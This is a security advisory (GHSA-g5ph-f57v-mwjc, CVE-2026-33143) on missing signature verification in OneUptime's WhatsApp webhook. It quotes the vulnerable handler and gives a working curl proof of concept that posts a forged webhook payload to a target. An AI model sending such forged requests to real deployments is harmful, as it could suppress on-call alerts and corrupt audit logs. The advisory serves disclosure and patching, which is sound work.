# [H] OneUptime WhatsApp Webhook Missing Signature Verification

## Summary
Severity: High
Advisory: GHSA-g5ph-f57v-mwjc
CVE: CVE-2026-33143
CWE: CWE-345
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-g5ph-f57v-mwjc
Type: github-advisory

## Affected
- npm: `oneuptime` — affected >=0 <10.0.34

## Details
### Summary

The WhatsApp POST webhook handler (`/notification/whatsapp/webhook`) processes incoming status update events without verifying the Meta/WhatsApp `X-Hub-Signature-256` HMAC signature, allowing any unauthenticated attacker to send forged webhook payloads that manipulate notification delivery status records, suppress alerts, and corrupt audit trails. The codebase already implements proper signature verification for Slack webhooks.

### Details

**Vulnerable code — `App/FeatureSet/Notification/API/WhatsApp.ts` lines 372-430:**
```typescript
router.post(
  "/webhook",
  async (req: ExpressRequest, res: ExpressResponse, next: NextFunction) => {
    try {
      const body: JSONObject = req.body as JSONObject;
      // NO signature verification! No X-Hub-Signature-256 check!

      if (
        (body["object"] as string | undefined) !== "whatsapp_business_account"
      ) {
        return Response.sendEmptySuccessResponse(req, res);
      }

      const entries: JSONArray | undefined = body["entry"] as JSONArray | undefined;
      // ... processes entries and updates WhatsApp log status records
```

Compare with the Slack webhook which correctly validates signatures:

**`Common/Server/Middleware/SlackAuthorization.ts` line 58:**
```typescript
const isValid = crypto.timingSafeEqual(
    Buffer.from(computedSignature),
    Buffer.from(slackSignature)
);
```

The WhatsApp GET webhook correctly validates the verify token — only the POST handler (which processes actual events) is missing signature verification.

No existing CVEs cover webhook signature verification issues in OneUptime. The closest is GHSA-cw6x-mw64-q6pv (WhatsApp Resend Verification Auth Bypass), which is about a different WhatsApp-related authorization issue.

### PoC

**Environment:** OneUptime v10.0.23 via `docker compose up` (default configuration)

```bash
# Forge a delivery status update for any WhatsApp notification — no auth, no signature
curl -sv -X POST http://TARGET:8080/api/notification/whatsapp/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "object": "whatsapp_business_account",
    "entry": [{
      "id": "FAKE_WABA_ID",
      "changes": [{
        "value": {
          "messaging_product": "whatsapp",
          "metadata": {
            "display_phone_number": "+15550000000",
            "phone_number_id": "FAKE_PHONE_ID"
          },
          "messages": [{
            "from": "15551234567",
            "id": "wamid.FAKE",
            "timestamp": "1234567890",
            "text": {"body": "INJECTED_MESSAGE"},
            "type": "text"
          }]
        },
        "field": "messages"
      }]
    }]
  }'
```

**Docker validation (oneuptime/app:release, APP_VERSION=10.0.23):**
```
< HTTP/1.1 200 OK
{}
```

- Fake WhatsApp webhook payload accepted with HTTP 200
- No `X-Hub-Signature-256` header provided — no signature verification at all
- Attacker can inject arbitrary inbound WhatsApp messages and forge delivery status updates

### Impact

Any unauthenticated remote attacker can forge WhatsApp webhook events:

- **False delivery status:** Mark undelivered WhatsApp notifications as "delivered", hiding delivery failures from administrators
- **Alert suppression:** Critical on-call notifications that failed to deliver appear successful, preventing escalation
- **Log manipulation:** WhatsApp notification logs updated with forged status data, corrupting audit trails
- **Incident response disruption:** During active incidents, forging "delivered" statuses prevents the system from retrying failed notification deliveries

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-g5ph-f57v-mwjc
- https://nvd.nist.gov/vuln/detail/CVE-2026-33143
- https://github.com/OneUptime/oneuptime
